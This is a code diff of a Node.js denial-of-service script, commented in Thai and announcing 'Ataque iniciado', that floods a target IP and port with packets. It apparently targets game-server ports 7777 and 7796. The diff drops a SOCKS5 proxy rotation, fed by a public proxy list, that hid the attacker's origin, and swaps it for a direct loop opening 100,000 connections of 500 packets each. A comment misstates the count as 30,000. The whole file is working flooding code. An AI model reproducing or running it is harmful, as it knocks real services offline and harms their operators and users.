@@ -1,5 +1,4 @@
 const axios = require('axios');
-const { SocksProxyAgent } = require('socks-proxy-agent'); // แก้ไขการนำเข้า
 const net = require('net');
 
 // ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
@@ -29,22 +28,16 @@ const packets = [
 
 console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);
 
-// ดาวน์โหลด proxy list
-async function getProxies() {
-    const response = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
-    return response.data.split('\n').filter(Boolean);
-}
-
-// ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
-async function sendPackets(proxy) {
-    const agent = new SocksProxyAgent(`socks5://${proxy}`); // แก้ไขที่นี่
-    const socket = net.createConnection({ host: ip, port: port, agent: agent });
+// ฟังก์ชันสำหรับส่งแพ็กเก็ต
+async function sendPackets() {
+    const socket = net.createConnection({ host: ip, port: port });
 
     socket.on('connect', () => {
-        for (let i = 0; i < 500; i++) { // ส่ง 500 แพ็กเก็ต
+        for (let i = 0; i < 500; i++) { // ส่ง 500 แพ็กเก็ตในแต่ละครั้ง
             const msg = packets[Math.floor(Math.random() * packets.length)];
             socket.write(msg);
 
+            // ส่ง cookie ขึ้นอยู่กับ port ที่กำหนด
             if (port == 7777) {
                 socket.write(packets[5]);
             } else if (port == 7796) {
@@ -61,18 +54,15 @@ async function sendPackets(proxy) {
     });
 
     socket.on('error', (err) => {
-        console.error(`Error with proxy ${proxy}: ${err.message}`);
+        console.error(`Error: ${err.message}`);
     });
 }
 
 // ฟังก์ชันหลัก
 async function startAttack() {
-    const proxies = await getProxies();
-    setInterval(() => {
-        proxies.forEach(proxy => {
-            sendPackets(proxy);
-        });
-    }, 1000); // ส่ง request ทุก 1 วินาที
+    for (let i = 0; i < 100000; i++) { // ส่ง 30,000 requests
+        sendPackets();
+    }
 }
 
 // เริ่มการทำงาน
